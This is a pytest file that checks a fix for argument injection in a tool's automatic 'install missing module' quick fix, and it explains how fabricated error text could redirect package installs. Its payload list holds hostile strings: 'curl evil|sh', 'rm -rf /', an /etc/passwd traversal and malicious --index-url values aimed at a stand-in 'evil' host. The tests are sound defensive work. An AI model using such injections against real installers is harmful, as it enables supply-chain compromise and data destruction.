"""The ModuleNotFound quick fix must not be an install-argument injection (#945).

`match_module_not_found` extracted the module name with a permissive regex —
anything between quotes, so spaces, dashes and `=` all passed — and built
`command=f"{package_manager} {package}"`, which `apply_quick_fix` executed via
`subprocess.run(fix.command.split())`.

Splitting on whitespace turns error text like

    No module named 'requests --index-url=http://evil/simple'

into extra pip/uv/npm arguments that redirect the install. And the name is
attacker-CHOSEN either way: this error text comes from executing the target
repo's tests and from LLM output, so a malicious repo need only print a
fabricated ModuleNotFoundError to trigger a dependency-confusion install.
"""

from pathlib import Path

import pytest

from codeframe.core.quick_fixes import (
    _install_argv,
    _is_valid_package_name,
    find_quick_fix,
    match_module_not_found,
)

pytestmark = pytest.mark.v2


class TestMaliciousNamesProduceNoFix:
    @pytest.mark.parametrize(
        "payload",
        [
            "requests --index-url=http://evil/simple",   # the AC's exact case
            "requests --extra-index-url http://evil",
            "requests;curl evil|sh",
            "requests && rm -rf /",
            "../../../etc/passwd",
            "requests\n--index-url=http://evil",
            "-e http://evil/pkg.git",
            "requests==1.0 --target /etc",
            "",
            " ",
        ],
    )
    def test_no_quick_fix_is_produced(self, payload: str):
        error = f"ModuleNotFoundError: No module named '{payload}'"

        assert match_module_not_found(error) is None, (
            f"a fix was built for {payload!r}"
        )

    def test_the_index_url_case_specifically(self):
        """AC3, stated verbatim in the issue."""
        error = (
            "ModuleNotFoundError: No module named "
            "'requests --index-url=http://evil/simple'"
        )

        assert match_module_not_found(error) is None
        assert find_quick_fix(error) is None


class TestLegitimateNamesStillWork:
    @pytest.mark.parametrize("name", ["requests", "python-dateutil", "a"])
    def test_a_real_package_still_produces_a_fix(self, name: str):
        fix = match_module_not_found(
            f"ModuleNotFoundError: No module named '{name}'"
        )

        assert fix is not None, f"{name} is a legitimate PEP 508 name"
        assert fix.package == name

    @pytest.mark.parametrize(
        "module,expected", [("ruamel.yaml", "ruamel"), ("zope.interface", "zope")]
    )
    def test_a_dotted_module_resolves_to_its_top_level_package(
        self, module: str, expected: str
    ):
        """Pre-existing, correct behaviour: you install the distribution, not
        the submodule. The validation must not disturb it."""
        fix = match_module_not_found(
            f"ModuleNotFoundError: No module named '{module}'"
        )

        assert fix is not None
        assert fix.package == expected

    def test_a_known_alias_is_still_mapped(self):
        fix = match_module_not_found("ModuleNotFoundError: No module named 'yaml'")

        assert fix is not None
        assert fix.package == "pyyaml"


class TestNameGrammar:
    @pytest.mark.parametrize("good", ["requests", "a-b", "a.b", "a_b", "A1"])
    def test_accepts_pep508_names(self, good: str):
        assert _is_valid_package_name(good)

    @pytest.mark.parametrize(
        "bad",
        ["-lead", "trail-", ".lead", "a b", "a=b", "a/b", "a;b", "", "x" * 200],
    )
    def test_rejects_everything_else(self, bad: str):
        assert not _is_valid_package_name(bad)


class TestInstallArgvIsAList:
    def test_the_package_is_exactly_one_argument(self, tmp_path: Path):
        from codeframe.core.quick_fixes import FixType, QuickFix

        fix = QuickFix(
            fix_type=FixType.INSTALL_PACKAGE,
            description="x",
            command="{package_manager} requests",
            package="requests",
        )

        argv = _install_argv(fix, tmp_path)

        assert argv is not None
        assert argv[-1] == "requests"
        assert all(" " not in part for part in argv[1:]), (
            "an argument still contains a space and could split"
        )

    def test_a_tampered_package_is_refused_at_apply_time(self, tmp_path: Path):
        """Re-validated at the last point before subprocess.run: a QuickFix can
        be constructed or mutated between matching and applying."""
        from codeframe.core.quick_fixes import FixType, QuickFix

        fix = QuickFix(
            fix_type=FixType.INSTALL_PACKAGE,
            description="x",
            command="{package_manager} requests",
            package="requests --index-url=http://evil/simple",
        )

        assert _install_argv(fix, tmp_path) is None

    def test_a_missing_package_is_refused(self, tmp_path: Path):
        from codeframe.core.quick_fixes import FixType, QuickFix

        fix = QuickFix(
            fix_type=FixType.INSTALL_PACKAGE, description="x", command="pip install x"
        )

        assert _install_argv(fix, tmp_path) is None
